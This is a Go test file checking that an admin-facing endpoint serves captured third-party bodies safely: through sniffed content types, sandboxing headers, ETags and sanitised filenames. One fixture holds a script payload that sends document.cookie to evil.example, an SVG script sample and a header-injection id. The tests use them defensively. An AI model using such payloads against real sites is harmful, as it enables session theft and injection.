package traffic

import (
	"encoding/base64"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/labstack/echo/v4"
	pgxmock "github.com/pashagolub/pgxmock/v4"
)

// These cover the locator form of the endpoint and the headers it serves
// under. The two are one subject: the endpoint's job is to hand over bytes a
// third party wrote, inside a browser already authenticated as an
// administrator, and every header here exists because of that sentence.

func expectArtifactRowBothDirections(mock pgxmock.PgxPoolIface, id, path string, reqBody, respBody []byte, endpointType string) {
	mock.ExpectQuery(`COALESCE\(a.ingress_format`).
		WithArgs(id).
		WillReturnRows(pgxmock.NewRows(normalizeInputCols).AddRow(
			"openai", "m", path,
			reqBody, "", respBody, "",
			"application/json", "application/json", nil, nil, endpointType, "", false, false))
}

func callArtifactRec(t *testing.T, h *Handler, id, query string, hdr map[string]string) *httptest.ResponseRecorder {
	t.Helper()
	e := echo.New()
	// The id goes in as a ROUTE PARAM, not spliced into the target: that is
	// how the router delivers it, and it is the only way to exercise an id
	// that would not survive being written into a URL.
	req := httptest.NewRequest(http.MethodGet, "/traffic/x/artifact"+query, nil)
	for k, v := range hdr {
		req.Header.Set(k, v)
	}
	rec := httptest.NewRecorder()
	c := e.NewContext(req, rec)
	c.SetParamNames("id")
	c.SetParamValues(id)
	if err := h.GetTrafficEventArtifact(c); err != nil {
		t.Fatalf("GetTrafficEventArtifact: %v", err)
	}
	return rec
}

// The point of the whole locator package: a reference published in the
// normalized payload is served by the same grammar that built it, from the
// REQUEST body — which the endpoint could not reach at all before.
func TestArtifact_ResolvesARequestSideLocator(t *testing.T) {
	h, mock := newHandlerWithMock(t)
	b64 := base64.StdEncoding.EncodeToString(artifactTinyPNG)
	reqBody := []byte(`{"model":"m","messages":[{"role":"user","content":[{"type":"image_url","image_url":{"url":"data:image/png;base64,` + b64 + `"}}]}]}`)
	expectArtifactRowBothDirections(mock, "req1", "/v1/chat/completions", reqBody, []byte(`{"choices":[]}`), "chat")

	rec := callArtifactRec(t, h, "req1",
		"?direction=request&locator=datauri:messages.0.content.0.image_url.url", nil)
	if rec.Code != http.StatusOK {
		t.Fatalf("status=%d want 200 (%s)", rec.Code, rec.Body.String())
	}
	if got := rec.Header().Get("Content-Type"); got != "image/png" {
		t.Fatalf("content-type=%q", got)
	}
	if rec.Body.Len() != len(artifactTinyPNG) {
		t.Fatalf("served %d bytes, want %d", rec.Body.Len(), len(artifactTinyPNG))
	}
}

// Every response carries the headers that keep a captured body from acting.
// Asserted on a SUCCESSFUL serve, because that is the only response where
// getting them wrong matters.
func TestArtifact_ServesUnderContainmentHeaders(t *testing.T) {
	h, mock := newHandlerWithMock(t)
	b64 := base64.StdEncoding.EncodeToString(artifactTinyPNG)
	expectArtifactRow(mock, "hdr1", "/v1/images/generations",
		[]byte(`{"data":[{"b64_json":"`+b64+`"}]}`), "application/json")

	rec := callArtifactRec(t, h, "hdr1", "", nil)
	if rec.Code != http.StatusOK {
		t.Fatalf("status=%d", rec.Code)
	}
	for header, want := range map[string]string{
		"X-Content-Type-Options":       "nosniff",
		"Cross-Origin-Resource-Policy": "same-origin",
		"Cache-Control":                "private, no-store",
	} {
		if got := rec.Header().Get(header); got != want {
			t.Fatalf("%s = %q, want %q", header, got, want)
		}
	}
	csp := rec.Header().Get("Content-Security-Policy")
	for _, want := range []string{"default-src 'none'", "sandbox", "frame-ancestors 'none'"} {
		if !strings.Contains(csp, want) {
			t.Fatalf("CSP %q is missing %q", csp, want)
		}
	}
	if et := rec.Header().Get("ETag"); et == "" || !strings.HasPrefix(et, `"`) {
		t.Fatalf("ETag = %q, want a quoted digest", et)
	}
	// A recognised inline type renders, and the download is named so a
	// user who saves it gets a file their system can open.
	cd := rec.Header().Get("Content-Disposition")
	if !strings.HasPrefix(cd, "inline;") || !strings.Contains(cd, ".png") {
		t.Fatalf("Content-Disposition = %q", cd)
	}
}

// The ETag is the digest of the bytes, so a revalidation is free and a
// changed artifact can never be served from a stale cache entry.
func TestArtifact_RevalidatesOnItsOwnDigest(t *testing.T) {
	h, mock := newHandlerWithMock(t)
	b64 := base64.StdEncoding.EncodeToString(artifactTinyPNG)
	body := []byte(`{"data":[{"b64_json":"` + b64 + `"}]}`)
	expectArtifactRow(mock, "et1", "/v1/images/generations", body, "application/json")
	first := callArtifactRec(t, h, "et1", "", nil)
	etag := first.Header().Get("ETag")

	expectArtifactRow(mock, "et1", "/v1/images/generations", body, "application/json")
	second := callArtifactRec(t, h, "et1", "", map[string]string{"If-None-Match": etag})
	if second.Code != http.StatusNotModified {
		t.Fatalf("status=%d want 304", second.Code)
	}
	if second.Body.Len() != 0 {
		t.Fatalf("a 304 must carry no body, got %d bytes", second.Body.Len())
	}

	// A digest that does not match still serves.
	expectArtifactRow(mock, "et1", "/v1/images/generations", body, "application/json")
	third := callArtifactRec(t, h, "et1", "", map[string]string{"If-None-Match": `"someone-elses"`})
	if third.Code != http.StatusOK {
		t.Fatalf("status=%d want 200 for a non-matching digest", third.Code)
	}
}

// The served type comes from the BYTES. A payload that declares itself an
// image and carries markup must not be handed to the browser as an image —
// that is the whole reason this endpoint sniffs rather than forwards.
func TestArtifact_DeclaredTypeIsNotTrusted(t *testing.T) {
	for _, tc := range []struct{ name, payload string }{
		{"html", `<!doctype html><script>fetch('//evil.example?c='+document.cookie)</script>`},
		{"svg with script", `<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>`},
		{"xml", `<?xml version="1.0"?><a/>`},
	} {
		t.Run(tc.name, func(t *testing.T) {
			h, mock := newHandlerWithMock(t)
			b64 := base64.StdEncoding.EncodeToString([]byte(tc.payload))
			reqBody := []byte(`{"messages":[{"content":[{"image_url":{"url":"data:image/png;base64,` + b64 + `"}}]}]}`)
			expectArtifactRowBothDirections(mock, "x1", "/v1/chat/completions", reqBody, []byte(`{}`), "chat")

			rec := callArtifactRec(t, h, "x1",
				"?direction=request&locator=datauri:messages.0.content.0.image_url.url", nil)
			if rec.Code != http.StatusOK {
				t.Fatalf("status=%d", rec.Code)
			}
			if got := rec.Header().Get("Content-Type"); got != "application/octet-stream" {
				t.Fatalf("content-type=%q — the declared image/png was believed", got)
			}
			cd := rec.Header().Get("Content-Disposition")
			if !strings.HasPrefix(cd, "attachment;") {
				t.Fatalf("Content-Disposition = %q, want attachment for an unrenderable type", cd)
			}
		})
	}
}

// Failures name themselves with a status the UI can branch on, and the
// reason is what decides it — not the message text.
func TestArtifact_FailureStatusesComeFromTheReason(t *testing.T) {
	b64 := base64.StdEncoding.EncodeToString(artifactTinyPNG)
	reqBody := []byte(`{"messages":[{"content":[{"image_url":{"url":"data:image/png;base64,` + b64 + `"}}]}]}`)
	for _, tc := range []struct {
		name, query string
		want        int
	}{
		{"unknown direction", "?direction=sideways&locator=body", http.StatusBadRequest},
		{"malformed locator", "?direction=request&locator=wat:x", http.StatusBadRequest},
		{"locator addresses nothing", "?direction=request&locator=json:nope", http.StatusNotFound},
		{"value is not decodable", "?direction=request&locator=json:messages.0.content.0.image_url.url", http.StatusUnprocessableEntity},
	} {
		t.Run(tc.name, func(t *testing.T) {
			h, mock := newHandlerWithMock(t)
			expectArtifactRowBothDirections(mock, "f1", "/v1/chat/completions", reqBody, []byte(`{}`), "chat")
			rec := callArtifactRec(t, h, "f1", tc.query, nil)
			if rec.Code != tc.want {
				t.Fatalf("status=%d want %d (%s)", rec.Code, tc.want, rec.Body.String())
			}
		})
	}
}

// An event with no captured body on the asked-for side says so, rather than
// resolving against an empty document and reporting the locator as wrong.
func TestArtifact_MissingBodyOnThatSideIsNamed(t *testing.T) {
	h, mock := newHandlerWithMock(t)
	expectArtifactRowBothDirections(mock, "nb1", "/v1/chat/completions", nil, []byte(`{}`), "chat")
	rec := callArtifactRec(t, h, "nb1", "?direction=request&locator=json:a", nil)
	if rec.Code != http.StatusNotFound {
		t.Fatalf("status=%d want 404", rec.Code)
	}
	if !strings.Contains(rec.Body.String(), "request") {
		t.Fatalf("the answer must say which side is missing: %s", rec.Body.String())
	}
}

// The filename is built from OUR id and the SNIFFED type, so nothing a
// provider sends can choose what a browser writes to disk.
func TestArtifact_FilenameCannotBeChosenByThePayload(t *testing.T) {
	h, mock := newHandlerWithMock(t)
	b64 := base64.StdEncoding.EncodeToString(artifactTinyPNG)
	expectArtifactRow(mock, `evil"; drop`, "/v1/images/generations",
		[]byte(`{"data":[{"b64_json":"`+b64+`"}]}`), "application/json")

	rec := callArtifactRec(t, h, `evil"; drop`, "", nil)
	cd := rec.Header().Get("Content-Disposition")
	if strings.Count(cd, `"`) != 2 {
		t.Fatalf("Content-Disposition is not a single quoted filename: %q", cd)
	}
	// The id's own letters SHOULD survive — that is what makes the download
	// traceable. What must not survive is anything that could end the
	// quoted string, add a header parameter, or start a new header line.
	for _, bad := range []string{`"`, ";", "\r", "\n", " ", "=", ","} {
		if strings.Contains(strings.TrimPrefix(cd, `inline; filename=`), bad) && bad != `"` {
			t.Fatalf("%q survived into the filename: %q", bad, cd)
		}
	}
	if !strings.Contains(cd, "evildrop") {
		t.Fatalf("the id's safe characters must survive so the file is traceable: %q", cd)
	}
}

// An iPhone photo submitted as a video input reference is a real wire shape:
// multipartbound prefers the part's declared Content-Type, so image/heic is
// recorded, the bytes are captured by handover, and generic_http makes them a
// captured ref with locator "body". The endpoint then decides what to serve —
// and it used to answer video/mp4, inline, named .mp4, while the Agent
// Dashboard called the same bytes image/heic.
func TestArtifact_ISOBMFFBrandsAreNotAllServedAsVideo(t *testing.T) {
	brand := func(s string) []byte {
		b := append([]byte{0, 0, 0, 0x1c}, append([]byte("ftyp"), []byte(s)...)...)
		return append(b, make([]byte, 32)...)
	}
	for _, tc := range []struct {
		brand, wantType, wantExt string
		wantInline               bool
	}{
		{"heic", "image/octet-stream-not-checked", "heic", false},
		{"avif", "image/octet-stream-not-checked", "avif", false},
		{"isom", "video/mp4", "mp4", true},
		{"M4A ", "audio/mp4", "m4a", true},
	} {
		t.Run(tc.brand, func(t *testing.T) {
			h, mock := newHandlerWithMock(t)
			expectArtifactRowBothDirections(mock, "b1", "/v1/videos", brand(tc.brand), []byte(`{}`), "video")
			rec := callArtifactRec(t, h, "b1", "?direction=request&locator=body", nil)
			if rec.Code != http.StatusOK {
				t.Fatalf("status=%d", rec.Code)
			}
			cd := rec.Header().Get("Content-Disposition")
			if !strings.Contains(cd, "."+tc.wantExt) {
				t.Fatalf("download named %q, want a .%s", cd, tc.wantExt)
			}
			// A still image must never be handed over as a movie: the reader
			// gets a player that shows nothing and a file their system
			// cannot open.
			if strings.HasPrefix(tc.brand, "heic") || tc.brand == "avif" {
				if got := rec.Header().Get("Content-Type"); strings.HasPrefix(got, "video/") {
					t.Fatalf("a still image was served as %q", got)
				}
			}
			inline := strings.HasPrefix(cd, "inline;")
			if inline != tc.wantInline {
				t.Fatalf("inline=%v, want %v (%q)", inline, tc.wantInline, cd)
			}
		})
	}
}

// A PDF still serves; it downloads. ui-shared's NEVER_INLINE_MIMES already
// refused it — a captured body is attacker-influenced content and a PDF
// viewer is a rendering context — and the server is the half that actually
// decides, so the two halves of one feature must not disagree.
func TestArtifact_PDFDownloadsRatherThanRendering(t *testing.T) {
	h, mock := newHandlerWithMock(t)
	pdf := append([]byte("%PDF-1.4\n"), make([]byte, 32)...)
	expectArtifactRowBothDirections(mock, "p1", "/v1/chat/completions", pdf, []byte(`{}`), "chat")

	rec := callArtifactRec(t, h, "p1", "?direction=request&locator=body", nil)
	if rec.Code != http.StatusOK {
		t.Fatalf("status=%d", rec.Code)
	}
	cd := rec.Header().Get("Content-Disposition")
	if !strings.HasPrefix(cd, "attachment;") {
		t.Fatalf("Content-Disposition = %q, want attachment", cd)
	}
	// It must still be reachable — refusing to render is not refusing to serve.
	if rec.Body.Len() != len(pdf) {
		t.Fatalf("served %d bytes of %d", rec.Body.Len(), len(pdf))
	}
	if !strings.Contains(cd, ".pdf") {
		t.Fatalf("the download must still be named for what it is: %q", cd)
	}
}
